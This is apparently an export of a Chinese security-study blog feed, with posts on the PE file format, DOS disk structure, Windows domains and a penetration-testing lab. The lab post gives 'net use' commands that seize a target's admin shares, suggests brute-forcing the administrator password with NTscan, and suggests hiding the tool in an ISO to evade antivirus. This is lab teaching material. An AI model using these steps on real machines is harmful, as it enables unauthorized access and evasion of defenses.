        <content type="html"><![CDATA[<h2 id="PE文件概述"><a href="#PE文件概述" class="headerlink" title="PE文件概述"></a>PE文件概述</h2><ul><li>PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件(可能是间接被执行，如DLL) (摘自百度百科)</li><li>可执行文件在内存中都以4D 5A(H)开头</li><li>不同操作系统的PE文件结构是不同的，如果一个可执行文件的结构不符合操作系统的要求，则这个文件不能在这个操作系统上运行</li><li>一个可执行程序的数据在硬盘和内存中基本是一样的，只是数据存放方式不同(映射)</li><li>一个可执行文件是由几个PE文件组成的</li></ul><h2 id="程序运行过程"><a href="#程序运行过程" class="headerlink" title="程序运行过程"></a>程序运行过程</h2><p><img src="https://pic.downk.cc/item/5e8add23504f4bcb04f26e92.png" alt=""><br>可执行文件(PE文件/硬盘结构)-&gt;读到FileBuffer文件中-&gt;读到ImageBuffer内存中(4GB)<br>：操作系统的PE loader进行加载(拉伸)，此时文件格式符合操作系统运行条件，且起始地址为ImageBase,所以程序执行时真正的入口点要加上ImageBase。</p><blockquote><p>注：程序经过拉伸之后才能运行。ImageBuffer所用的地址为虚拟地址，由操作系统将虚拟地址转换为物理地址。</p></blockquote><h3 id="内核重载"><a href="#内核重载" class="headerlink" title="内核重载"></a>内核重载</h3><p>内核有一个.exe文件，用于启动程序。内核重载即重新写该.exe程序，也就是重写PE loader。</p><blockquote><p>注：PE文件执行中的状态(ImageBuffer)与不执行的状态(FileBuffer)在工具里打开的样子是不同的，具体问题具体分析，若打开的文件处在FileBuffer的状态，则全看文件地址及文件偏移；若打开的文件处于ImageBuffer状态，则全看虚拟地址，RVA。</p></blockquote><h2 id="内存地址转换"><a href="#内存地址转换" class="headerlink" title="内存地址转换"></a>内存地址转换</h2><ul><li>虚拟内存地址 （Virtual Address， VA）PE文件中的指令被装入内存后的地址</li><li>相对虚拟地址（Relative Virtual Address，RVA）相对虚拟地址是内存地址相对于映射基地址偏移量</li><li>文件偏移地址（file offset）文件相对于文件开头的偏移</li><li>装载基址（image base）PE装入内存时的基地址，EXE在内存中的基地址是0x00400000,DLL的基地址是0x10000000，这些位置可以通过修改编译选项更改</li></ul><h3 id="计算RVA"><a href="#计算RVA" class="headerlink" title="计算RVA"></a>计算RVA</h3><p>RVA = VA - imageBase</p><h3 id="计算VA"><a href="#计算VA" class="headerlink" title="计算VA"></a>计算VA</h3><p>VA = ImageBase+RVA</p><h3 id="计算fileOffset"><a href="#计算fileOffset" class="headerlink" title="计算fileOffset"></a>计算fileOffset</h3><p>fileOffset = RVA-节的RVA+节的文件偏移地址</p><h2 id="图例"><a href="#图例" class="headerlink" title="图例"></a>图例</h2><p>此图例是文件在FileBuffer中的状态<br><img src="https://pic.downk.cc/item/5e8add33504f4bcb04f27c4a.png" alt=""><br><img src="https://pic.downk.cc/item/5e8add5c504f4bcb04f2a24d.png" alt=""></p><h3 id="分节"><a href="#分节" class="headerlink" title="分节"></a>分节</h3><p>PE文件格式中一段数据前后会有长达几行的全0隔开，这种划分方式叫做分节。分节的原因：节省内存空间(老式编译器)、节省内存</p><h4 id="节省硬盘空间"><a href="#节省硬盘空间" class="headerlink" title="节省硬盘空间"></a>节省硬盘空间</h4><p><img src="https://pic.downk.cc/item/5e8adcc3504f4bcb04f21ea7.png" alt=""><br>上述所说的内存空间是虚拟内存空间，就算内存条只有1GB，每个PE都有独立的4GB的内存空间(其中2GB是给应用程序用(0-7FFFFFFFH)，其他2GB给操作系统用)</p><blockquote><p>注：不同的编译器，间隙不同。现在新式的编译器硬盘和内存空隙可以相同。</p></blockquote><h5 id="硬盘-内存对齐"><a href="#硬盘-内存对齐" class="headerlink" title="硬盘/内存对齐"></a>硬盘/内存对齐</h5><p>硬盘/内存对齐相当于我们看书，有的时候就只有几个字，但是这几个字仍然占了一页，硬盘和内存也同样如此，就算数据不满一页，这些数据也会占据一页的空间。</p><ul><li>对齐有利于查看，加快查看速度</li><li>现在有些编译器的硬盘对齐和内存对齐是一样</li></ul><p>磁盘与内存存储方式不同时，PE磁盘文件与内存映射结构图：<br><img src="https://pic.downk.cc/item/5e8adcd4504f4bcb04f22d9a.png" alt=""><br>.text节即为.code节</p><h4 id="节省内存"><a href="#节省内存" class="headerlink" title="节省内存"></a>节省内存</h4><p>多开的时候(运行多个相同程序)，避免数据段重复利用。</p><h2 id="解析PE文件"><a href="#解析PE文件" class="headerlink" title="解析PE文件"></a>解析PE文件</h2><h3 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h3><p>DOS头的数据结构(64字节)：最重要的是第一个和最后一个</p><pre class=" language-bash"><code class="language-bash">struct _IMAGE_DOS_HEADER <span class="token punctuation">{</span>      // DOS .EXE header*  WORD   e_magic<span class="token punctuation">;</span>                     // 5A4DH     WORD   e_cblp<span class="token punctuation">;</span>                      // 0090H   WORD   e_cp<span class="token punctuation">;</span>                        // 0003H   WORD   e_crlc<span class="token punctuation">;</span>                      // 0000H   WORD   e_cparhdr<span class="token punctuation">;</span>                   // 0004H   WORD   e_minalloc<span class="token punctuation">;</span>                  // 0000H   WORD   e_maxalloc<span class="token punctuation">;</span>                  // FFFFH   WORD   e_ss<span class="token punctuation">;</span>                        // 0000H   WORD   e_sp<span class="token punctuation">;</span>                        // 00B8H   WORD   e_csum<span class="token punctuation">;</span>                      // 0000H   WORD   e_ip<span class="token punctuation">;</span>                        // 0000H   WORD   e_cs<span class="token punctuation">;</span>                        // 0000H   WORD   e_lfarlc<span class="token punctuation">;</span>                    // 0040H   WORD   e_ovno<span class="token punctuation">;</span>                      // 0000H   WORD   e_res<span class="token punctuation">[</span>4<span class="token punctuation">]</span><span class="token punctuation">;</span>                    // 长度为4的数组，要往后数8个字节 00 00 00 00 00 00 00 00H   WORD   e_oemid<span class="token punctuation">;</span>                     // 0000H   WORD   e_oeminfo<span class="token punctuation">;</span>                   // 0000H   WORD   e_res2<span class="token punctuation">[</span>10<span class="token punctuation">]</span><span class="token punctuation">;</span>                  //长度为10的数组，往后数20个字节 *  DWORD   e_lfanew<span class="token punctuation">;</span>                    // 4字节，000000B0H 指向PE文件真正开始的位置，从文件开始的地方偏移B0个字节的位置就是PE文件开始的地方，中间偏移的位置都是垃圾数据<span class="token punctuation">(</span>PE字样所在位置<span class="token punctuation">)</span>  <span class="token punctuation">}</span> </code></pre><blockquote><p>注：BYTE是1字节；WORD是指unsigned short类型，占2字节；DWORD是指unsigned long类型，占4字节</p></blockquote><h3 id="NT头-PE头"><a href="#NT头-PE头" class="headerlink" title="NT头(PE头)"></a>NT头(PE头)</h3><p>NT头包括标准PE头和可选PE头，可选PE头不是可有可无的。<br>NT头的数据结构：</p><pre class=" language-bash"><code class="language-bash"> struct _IMAGE_NT_HEADERS <span class="token punctuation">{</span>    DWORD Signature<span class="token punctuation">;</span>                                   //标记 （重要，判断是否为PE文件的第二个标志）00004550H    IMAGE_FILE_HEADER FileHeader<span class="token punctuation">;</span>                      //标准PE头，文件头（重要，存储着PE文件的基本信息）    IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span>  //可选PE头（重要，存储着关于PE文件时加载的信息）</code></pre><h4 id="标准PE头"><a href="#标准PE头" class="headerlink" title="标准PE头"></a>标准PE头</h4><p>标准PE头的数据结构:打* 为需要记忆的部分<br>(20字节)</p><pre class=" language-bash"><code class="language-bash">struct _IMAGE_FILE_HEADER<span class="token punctuation">{</span>    *   WORD Machine<span class="token punctuation">;</span>    // 程序运行的CPU型号    014CH *   WORD NumberOfSections<span class="token punctuation">;</span>    // 文件中存在的节的总数<span class="token punctuation">(</span>除了DOS头和NT头<span class="token punctuation">)</span>，如果要新增节或合并节，就要修改这个值    0003H *   DWORD TimeDateStamp<span class="token punctuation">;</span>    // 文件创建时间    428F4D9BH     DWORD PointerToSymbolTable<span class="token punctuation">;</span>    // 符号表偏移    00000000H    DWORD NumberOfSymbols<span class="token punctuation">;</span>    // 符号个数   00000000H*   WORD SizeOfOptionalHeader<span class="token punctuation">;</span>    //可选PE头大小   00E0H      WORD Characteristics<span class="token punctuation">;</span>    // PE文件属性   010FH<span class="token punctuation">}</span></code></pre><h4 id="可选PE头"><a href="#可选PE头" class="headerlink" title="可选PE头"></a>可选PE头</h4><p>可选PE头的数据结构:</p><pre class=" language-bash"><code class="language-bash">struct _IMAGE_OPTIONAL_HEADER <span class="token punctuation">{</span>*   WORD    Magic<span class="token punctuation">;</span>　　　　　　　　　　　　　　　　　　//机器型号,判断是PE是32位还是64位     BYTE    MajorLinkerVersion<span class="token punctuation">;</span>　　　　　　　　　　//连接器版本号高版本    BYTE    MinorLinkerVersion<span class="token punctuation">;</span>　　　　　　　　　　//连接器版本号低版本,组合起来就是 5.12 其中5是高版本,C是低版本*   DWORD   SizeOfCode<span class="token punctuation">;</span>　　　　　　　　　　　　　　　//代码节的总大小<span class="token punctuation">(</span>必须为文件节对齐大小<span class="token punctuation">(</span>FileAlignment字段大小<span class="token punctuation">)</span>的整数倍<span class="token punctuation">)</span>，没用*   DWORD   SizeOfInitializedData<span class="token punctuation">;</span>　　　　　　　　//初始化数据的节的总大小,也就是.data，没用*   DWORD   SizeOfUninitializedData<span class="token punctuation">;</span>　　　　　　 //未初始化数据的节的大小 *   DWORD   AddressOfEntryPoint<span class="token punctuation">;</span>　　　　　　　　  //程序执行入口<span class="token punctuation">(</span>OEP<span class="token punctuation">)</span> RVA<span class="token punctuation">(</span>相对偏移<span class="token punctuation">)</span>*   DWORD   BaseOfCode<span class="token punctuation">;</span>　　　　　　　　　　　　　　//代码段起始位置RVA,偏移+模块首地址定位代码区*   DWORD   BaseOfData<span class="token punctuation">;</span>　　　　　　　　　　　　　　 //数据节的起始偏移<span class="token punctuation">(</span>RVA<span class="token punctuation">)</span>,同上*   DWORD   ImageBase<span class="token punctuation">;</span>　　　　　　　　　　　　　　　//内存映像基址，ImageBuffer的起始地址<span class="token punctuation">(</span>见下文<span class="token punctuation">)</span>*   DWORD   SectionAlignment<span class="token punctuation">;</span>　　　　　　　　　　　//内存中的节对齐大小*   DWORD   FileAlignment<span class="token punctuation">;</span>　　　　　　　　　　　　　//文件<span class="token punctuation">(</span>硬盘<span class="token punctuation">)</span>中的节对齐大小    WORD    MajorOperatingSystemVersion<span class="token punctuation">;</span>　　　　//操作系统版本号高位    WORD    MinorOperatingSystemVersion<span class="token punctuation">;</span>　　　　//操作系统版本号低位    WORD    MajorImageVersion<span class="token punctuation">;</span>　　　　　　　　　　//PE版本号高位    WORD    MinorImageVersion<span class="token punctuation">;</span>　　　　　　　　　　//PE版本号低位    WORD    MajorSubsystemVersion<span class="token punctuation">;</span>　　　　　　　　//子系统版本号高位    WORD    MinorSubsystemVersion<span class="token punctuation">;</span>　　　　　　　　//子系统版本号低位    DWORD   Win32VersionValue<span class="token punctuation">;</span>　　　　　　　　　　//32位系统版本号值,注意只能修改为4 5 6表示操作系统支持nt4.0 以上,5的话依次类推*   DWORD   SizeOfImage<span class="token punctuation">;</span>　　　　　　　　　　　　   //整个程序在内存中占用的空间<span class="token punctuation">(</span>PE映尺寸<span class="token punctuation">)</span>，是SectionAlignment的整数倍，即ImageBuffer的大小*   DWORD   SizeOfHeaders<span class="token punctuation">;</span>　　　　　　　　　　　　//所有头和节表严格按照SectionAlignment对齐后的大小，否则会加载出错<span class="token punctuation">(</span>包括DOS头、NT头、节表<span class="token punctuation">)</span>    DWORD   CheckSum<span class="token punctuation">;</span>　　　　　　　　　　　　　　 //出校验和，一些系统文件有要求，用来判断文件是否被修改    WORD    Subsystem<span class="token punctuation">;</span>　　　　　　　　　　　　　　//文件的子系统     WORD    DllCharacteristics<span class="token punctuation">;</span>　　　　　　　　 //DLL文件属性,也可以成为特性,可能DLL文件可以当做驱动程序使用*   DWORD   SizeOfStackReserve<span class="token punctuation">;</span>　　　　　　　　//初始化时保留的堆栈大小*   DWORD   SizeOfStackCommit<span class="token punctuation">;</span>　　　　　　　　 //初始化时实际提交的堆栈大小*   DWORD   SizeOfHeapReserve<span class="token punctuation">;</span>　　　　　　　　//初始化时保留的堆的大小*   DWORD   SizeOfHeapCommit<span class="token punctuation">;</span>　　　　　　　　 //初始化时实际提交的堆的大小    DWORD   LoaderFlags<span class="token punctuation">;</span>　　　　　　　　　　　　//与调试有关*   DWORD   NumberOfRvaAndSizes<span class="token punctuation">;</span>　　　　　　　//目录项数目*   typedef struct _IMAGE_DATA_DIRECTORY <span class="token punctuation">{</span>    DWORD VirtualAddress<span class="token punctuation">;</span>    DWORD Size<span class="token punctuation">;</span><span class="token punctuation">}</span> IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY//数据目录,默认16个,16是宏,这里方便直接写成16</code></pre><blockquote><p>注：代码入口不等于程序入口。程序在内存中真正的入口= ImageBase+AddressOfEntryPoint</p></blockquote><h2 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h2><p>如果我们想存储一个人的学号和身份证号，可以设计成下面的形式：</p><pre class=" language-bash"><code class="language-bash">struct Student<span class="token punctuation">{</span>  char 学号<span class="token punctuation">;</span>  int 身份证号<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>但是上述的形式每次最多只会用到一个成员，另一个成员的空间永远都是浪费的。</p><h3 id="联合类型-1"><a href="#联合类型-1" class="headerlink" title="联合类型"></a>联合类型</h3><p>特点：</p><ul><li>联合体的成员是共享内存空间的</li><li>联合体的内存空间大小是联合体成员中对内存空间要求最大的空间大小</li><li>联合体最多只有一个成员有效</li></ul><pre class=" language-bash"><code class="language-bash">union TestUnion<span class="token punctuation">{</span>  char x<span class="token punctuation">;</span>  int y<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><ul><li>节表是对节的具体描述信息，节是线性存储的。</li><li>节表位置定位：DOS头找到PE标准头，紧接着是可选PE头，可选PE头里的SizeOfOptionalHeaders指定PE可选头大小，之后就是节表。</li><li>或从PE标准头跳转F8个位置到节表</li><li>从节表开始每40个字节表示一个区段<br>节表的数据结构：<br>```bash<br>IMAGE_SECTION_HEADER STRUCT<br>BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 8个字节的节区名称<br>union Misc{                         //4字节<br>DWORD PhysicalAddress;       </li></ul><ul><li>DWORD VirtualSize;            //内存中对齐块的大小，指定节的大小</li></ul><p>}</p><ul><li><p>DWORD VirtualAddress;         // 节区在内存ImageBuffer中的偏移地址，加上ImageBase才是在内存中的真正地址</p></li><li><p>DWORD SizeOfRawData;            // 在文件中对齐块的尺寸(在FileBuffer中的尺寸)</p></li><li><p>DWORD PointerToRawData;        // 在文件FileBuffer中的偏移量(离PE文件开始的地方的偏移)</p><p>DWORD PointerToRelocations;     // 在OBJ文件中使用，重定位的偏移</p><p>DWORD PointerToLinenumbers;   // 行号表的偏移（供调试使用地）</p><p>WORD NumberOfRelocations;      // 在OBJ文件中使用，重定位项数目</p><p>WORD NumberOfLinenumbers;    // 行号表中行号的数目</p></li><li><p>DWORD Characteristics;       // 执行权限，如可读，可写，可执行等，占了4字节，20H表示包含了可执行代码，40H表示包含已初始化数据，80H表示包含未初始化数据</p></li></ul><pre><code>&gt; 注：相对虚拟地址(RVA)即指ImageBuffer里的偏移地址## 节(Sections)采用节的方式进行属性的划分。+ 判断节有几段：标准PE头NumberOfSections## 导入表导入表信息包含在可选PE头中的IMAGE_DATA_DIRECTORY里，即可选PE头96字节后就是导入表的位置(十六进制加60H)，规定文件中的数据段中的数据怎样使用：```bash----8字节-------        //IMAGE_DATA_DIRECTORY的结构体占8字节Image_Directory_entry_export //8字节，输出表的RVA值(前4位)及大小Image_Directory_entry_import //8字节，输入表的RVA值及大小-----24个字节----------      //24个字节代表的导入表此处省略</code></pre><h3 id="解析导入表"><a href="#解析导入表" class="headerlink" title="解析导入表"></a>解析导入表</h3><p>此例中没有输出表</p><h4 id="解析输入表"><a href="#解析输入表" class="headerlink" title="解析输入表"></a>解析输入表</h4><ul><li>输入表的RVA为00002014，大小为0000003C，要将RVA转换成FileOffset</li><li>查看节表中的VituralAddress,找到输入表属于哪个段(此例中属于.rdata段)</li><li>输入表的File Offset = 2014H-2000H(.rdata段起始地址)+600H(.rdata段的文件偏移 节表中的PointToRawData) = 614H</li><li>从文件起始偏移614H大小为3CH的区域即为输入表信息。</li></ul><p>对于输入表来说，每20个字节对应一个DLL的调用，这些表是采用数组的指针的方式进行保存的。</p><h4 id="第一个dll"><a href="#第一个dll" class="headerlink" title="第一个dll"></a>第一个dll</h4><h5 id="动态链接库名"><a href="#动态链接库名" class="headerlink" title="动态链接库名"></a>动态链接库名</h5><p>每个调用的表偏移12个字节之后4个字节代表该dll的名字的RVA。此例中名字RVA为2072H</p><ul><li>将RVA转换成文件偏移地址 = 2071H-2000H+600H = 671H -&gt;672H位置显示的名字为kernel32.dll</li></ul><h5 id="查看kernel32-dll调用的导入函数-API"><a href="#查看kernel32-dll调用的导入函数-API" class="headerlink" title="查看kernel32.dll调用的导入函数(API)"></a>查看kernel32.dll调用的导入函数(API)</h5><ul><li>查看输入表信息的最开始的4字节，此例中为2050H，这个2050H就是API开始的RVA</li><li>将这个RVA转换成文件偏移:2050H-2000H+600H = 650H </li><li>从文件起始偏移650H即为导入函数的位置</li><li>此块每4个字节代表一个导入函数RVA，当4个字节全为0时，API信息结束(此例中导入了1个函数)</li></ul><h5 id="查看导入函数的信息"><a href="#查看导入函数的信息" class="headerlink" title="查看导入函数的信息"></a>查看导入函数的信息</h5><ul><li>将导入函数的RVA转换成文件偏移地址： 2064H-2000H+600H = 664H 该导入函数名称为ExitProcess</li></ul><h4 id="第二个dll"><a href="#第二个dll" class="headerlink" title="第二个dll"></a>第二个dll</h4><p>同理，第二个dll的名字RVA为209AH,则文件偏移地址为209A-2000H+600H=69AH-&gt;名称为User32.dll<br>该dll调用的API，查看最开始的4个字节：2058H-2000H+600H=658H-&gt;此dll调用了2个API</p><ul><li>第一个API：208CH-2000H+600H=68CH -&gt;函数名称为MessageBox</li><li>第二个API：2080H-2000H+600H = 680H -&gt;函数名称为wsprintf</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 逆向 </tag>
            
            <tag> PE文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试实战(1)</title>
      <link href="/2020/03/20/penetrationtest6/"/>
      <url>/2020/03/20/penetrationtest6/</url>
      
        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>客户机：Windows XP<br>服务器(靶机)：Windows Server 2003<br>两台计算机须处于同一网段，并能互相通信</p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>使用Windows XP对Windows Server 2003进行渗透测试</p><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问，如果成功连接IPC$，则客户机可对靶机进行任何操作。</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="测试服务器开放的端口号"><a href="#测试服务器开放的端口号" class="headerlink" title="测试服务器开放的端口号"></a>测试服务器开放的端口号</h3><p>测试服务器是否开放端口号的方法：</p><ol><li>用nmap进行端口扫描</li><li>手动探测：如果靶机开启了telnet服务(打开计算机管理-&gt;服务和应用程序-&gt;服务-&gt;telnet查看)，可以使用telnet指令进行开放端口的测试：</li></ol><ul><li>在终端输入 <font color="#fb8c00">telnet 靶机IP</font> 命令可判断靶机是否开启telnet服务</li><li>在终端输入 <font color="#fb8c00">telnet 靶机IP 端口号</font> 命令可判断靶机是否开启对应端口</li></ul><h3 id="445漏洞利用之IPC"><a href="#445漏洞利用之IPC" class="headerlink" title="445漏洞利用之IPC$"></a>445漏洞利用之IPC$</h3><h4 id="拓展使用"><a href="#拓展使用" class="headerlink" title="拓展使用"></a>拓展使用</h4><h5 id="服务器-靶机"><a href="#服务器-靶机" class="headerlink" title="服务器(靶机)"></a>服务器(靶机)</h5><p>在靶机新分区的磁盘(E盘)下新建一个文件夹share，将此文件夹改为共享文件，权限改为完全控制。</p><h5 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h5><p>使用以下命令，建立文件映射</p><pre class=" language-bash"><code class="language-bash">net use f: \\靶机IP\share 靶机登录密码 /user:administrator</code></pre><ul><li><font color="#fb8c00">f: \靶机IP\share</font> 把共享文件夹映射到本地，映射为F盘(客户机上不存在F盘)</li><li><font color="#fb8c00">靶机登录密码 /user:dministrator</font>：以对方管理员的身份运行</li></ul><p>此时在客户机终端对F盘进行操作相当于对服务器进行操作，在客户机中进入F盘后输入以下命令：</p><pre class=" language-bash"><code class="language-bash">md by</code></pre><p>此时在服务器share文件夹下会出现名为by文件夹,以上操作相当于客户机(WIN XP)在服务器建立了一个远程分区。</p><p>也可使用<font color="#fb8c00">c$</font>参数：</p><pre class=" language-bash"><code class="language-bash">net use f: \\10.1.1.1\c$ 密码 /user:administrator</code></pre><p>以上命令若链接成功，则客户机可以对服务器C盘进行操作</p><h4 id="实验操作"><a href="#实验操作" class="headerlink" title="实验操作"></a>实验操作</h4><p>在操作之前要断开客户机所有映射：</p><pre class=" language-bash"><code class="language-bash">net use * /del</code></pre><blockquote><p>注：使用上述命令后还要重新建立文件映射</p></blockquote><p>使用IPC$在客户机和服务器之间建立一条空链接，此命令用于在服务器端执行：</p><pre class=" language-bash"><code class="language-bash">net use \\10.1.1.1\ipc$ 密码 /user:administrator</code></pre><p>但是我们进行攻击时并不知道靶机的密码，所以要对其进行系统密码暴破(NTscan专用于445端口爆破，为了避免被杀软杀掉，可将其放入成iso文件夹中)。</p><p>连接成功后，即可在客户机上输入DOS命令对服务器(靶机)进行操作。比如查看靶机C盘：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">dir</span> \\10.1.1.1\c$</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析</title>
      <link href="/2020/03/11/reverse/"/>
      <url>/2020/03/11/reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="磁盘结构与组织"><a href="#磁盘结构与组织" class="headerlink" title="磁盘结构与组织"></a>磁盘结构与组织</h2><p>磁盘分为两种：软盘(Diskette)和硬盘(Fixed Disk)。</p><ul><li>扇区：每个磁道分为若干扇区(Sector)，每个扇区可以放512字节的数据。</li></ul><h3 id="磁道"><a href="#磁道" class="headerlink" title="磁道"></a>磁道</h3><p>磁盘格式化时被分成若干个同心圆，称为磁道。每条磁道由首部、18个扇区、尾部构成。</p><ul><li>首部：首部是允许一定的定位误差间隔</li><li>尾部：为了防止不同驱动器对软盘格式化时快速的变化</li></ul><h3 id="扇区"><a href="#扇区" class="headerlink" title="扇区"></a>扇区</h3><p>每个磁道分为若干扇区(Sector)，每个扇区可以放512字节的数据。每个扇区由四个部分组成：</p><ul><li>标识区(ID区)：标识扇区的开始和记录目标地址的信息</li><li>间隙：保护数据</li><li>数据区：记录数据</li><li>间隙：同上述间隙</li></ul><h3 id="物理扇区和逻辑扇区"><a href="#物理扇区和逻辑扇区" class="headerlink" title="物理扇区和逻辑扇区"></a>物理扇区和逻辑扇区</h3><p>磁盘的扇区定位可以通过两种方式实现：物理扇区和逻辑扇区</p><h4 id="物理扇区"><a href="#物理扇区" class="headerlink" title="物理扇区"></a>物理扇区</h4><p>物理扇区是指某个扇区在磁盘上的绝对位置，由驱动器号、面号、磁道号、扇区号4个参数组成</p><h4 id="逻辑扇区"><a href="#逻辑扇区" class="headerlink" title="逻辑扇区"></a>逻辑扇区</h4><p>逻辑扇区是指一张盘片上的所有扇区按扇区的访问顺序进行统一顺序编号，这个编号就称为逻辑扇区或相对扇区。</p><h4 id="换算关系"><a href="#换算关系" class="headerlink" title="换算关系"></a>换算关系</h4><p>逻辑扇区号(十进制) = (道号X总面数+面号)X每道扇区数+扇区号-系统隐藏扇区数-1<br>其中，系统隐藏扇区为在DOS区前非DOS使用的扇区数，软盘为0，硬盘为17</p><h4 id="簇"><a href="#簇" class="headerlink" title="簇"></a>簇</h4><p>DOS系统分配磁盘存储空间的最小单位是簇，一个簇由几个连续的逻辑扇区组成。</p><h2 id="DOS磁盘组织"><a href="#DOS磁盘组织" class="headerlink" title="DOS磁盘组织"></a>DOS磁盘组织</h2><p>DOS系统格式化的软盘由4个部分组成：引导扇区、文件分配表FAT、文件目录表FDT、数据区</p><h3 id="引导扇区"><a href="#引导扇区" class="headerlink" title="引导扇区"></a>引导扇区</h3><p>Boot Area,位于逻辑0扇区处，即软盘的0面0道1扇区上，由FORMAT.COM程序格式化磁盘时形成。其主要功能是完成DOS系统的启动。引导扇区由3个主要部分组成:</p><ul><li>磁盘基本输入输出参数块BPB：在引导扇区位移0B-1CH处,是长度为19个字节的BPB。BPB最后三个字节，从位移18H开始，说明磁盘的每道扇区数、磁头个数、隐藏扇区数，它们是给磁盘驱动程序使用的。</li><li>磁盘基数表： 对DOS引导盘，从引导扇区的位移21H开始的11个字节为磁盘基数表，它主要供磁盘驱动器硬件操作时使用</li><li>引导记录程序</li></ul><h3 id="文件分配表FAT"><a href="#文件分配表FAT" class="headerlink" title="文件分配表FAT"></a>文件分配表FAT</h3><p>FAT是DOS的一个重要数据表格，从逻辑1扇区开始，它存放每个文件在磁盘上的分布信息。磁盘上有两个完全相同的文件分配表，FAT1和FAT2,FAT2是FAT1的备份，是为了防止FAT1被破坏而特意设置的。</p><h3 id="文件目录表FDT"><a href="#文件目录表FDT" class="headerlink" title="文件目录表FDT"></a>文件目录表FDT</h3><p>它记录根目录下每一个磁盘文件的文件名、扩展名、生成时间、文件长度等信息</p><h3 id="数据区"><a href="#数据区" class="headerlink" title="数据区"></a>数据区</h3><p>除了上述三个区域外，磁盘剩余的空间都用来存储程序和数据。</p><h3 id="软盘"><a href="#软盘" class="headerlink" title="软盘"></a>软盘</h3><p>软盘容量计算：磁道数X每个磁道扇区数X扇区可存储数据面数X512(可移动U盘)</p><h2 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h2><p>硬盘容量=柱面数X扇区数X每扇区字节数X磁头数</p><h3 id="硬盘的数据组织"><a href="#硬盘的数据组织" class="headerlink" title="硬盘的数据组织"></a>硬盘的数据组织</h3><p>硬盘系统可以划分为几个分区，用以支持DOS以外的操作系统。硬盘最多可分为4个分区，每个分区可以具有不同大小的存储空间，但每个分区分配的存储空间是连续的。每一种操作系统在硬盘上建立的分区，操作时都由一个自己特有的实用程序来完成。DOS分区的实用程序为FDISK.COM</p><h3 id="硬盘数据分区"><a href="#硬盘数据分区" class="headerlink" title="硬盘数据分区"></a>硬盘数据分区</h3><p>硬盘初始化时，可根据用户选择的地址和大小建立一个或几个用于DOS的区域。经过分区后，在硬盘上就建立了一个硬盘的主引导扇区和几个分区(不大于4个)：<br><img src="https://i.postimg.cc/hth3KyvY/1.png" alt=""></p><h4 id="主引导扇区"><a href="#主引导扇区" class="headerlink" title="主引导扇区"></a>主引导扇区</h4><p>主引导扇区位于硬盘0面0柱1扇区，它是硬盘上的第一物理扇区。组成：</p><ul><li>主引导程序(位移量000H-1BDH)：用于硬盘启动时将系统控制转给用户指定的并在分区中登记了的某个操作系统区</li><li>分区表(位移量1BEH-1FDH):用于指明硬盘划分的情况，含4个可能的分区，每个分区的记录占用16个字节，由FDISK.COM程序建立<br>主引导扇区的最后两个字节(位移量1FE-1FFH)：”55AA”为其结束标志。</li></ul><p>主引导扇区存放硬盘的主引导记录。硬盘主引导记录包括三个方面的内容：</p><ul><li>主引导程序代码：用来找出系统当前的活动分区，负责把对应的一个操作系统的引导记录(当前活动分区的引导记录)装入内存，然后把控制权转给该分区的引导记录。</li><li>分区表：从位移量1BEH开始的64个字节是硬盘分区表</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 逆向工程 </tag>
            
            <tag> DOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Domain(域)</title>
      <link href="/2020/03/09/domain/"/>
      <url>/2020/03/09/domain/</url>
      
        <content type="html"><![CDATA[<h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><h3 id="域的概念"><a href="#域的概念" class="headerlink" title="域的概念"></a>域的概念</h3><p>域实际上代表一种环境(内网环境)，这种环境分两类:</p><ol><li>工作组：默认模式</li></ol><ul><li><p>查看方式：开始-&gt;系统：<br>![]<a href="https://pic.downk.cc/item/5e8ad8e7504f4bcb04eedea2.png" target="_blank" rel="noopener">https://pic.downk.cc/item/5e8ad8e7504f4bcb04eedea2.png</a>)</p></li><li><p>特点：人人平等(一台计算机不能控制另一台计算机)，不方便管理</p></li></ul><ol start="2"><li>域</li></ol><ul><li>特点：人人不平等，可以集中管理、统一管理</li></ul><h3 id="域的组成"><a href="#域的组成" class="headerlink" title="域的组成"></a>域的组成</h3><ol><li>域控制器：DC(Domain Controller)</li><li>成员机</li></ol><h3 id="域的结构"><a href="#域的结构" class="headerlink" title="域的结构"></a>域的结构</h3><ul><li>在域里DNS和DC配合工作，计算机加入域的瞬间，DNS会自动在生产解析记录。</li><li>在DC上有一张活动目录AD(Active 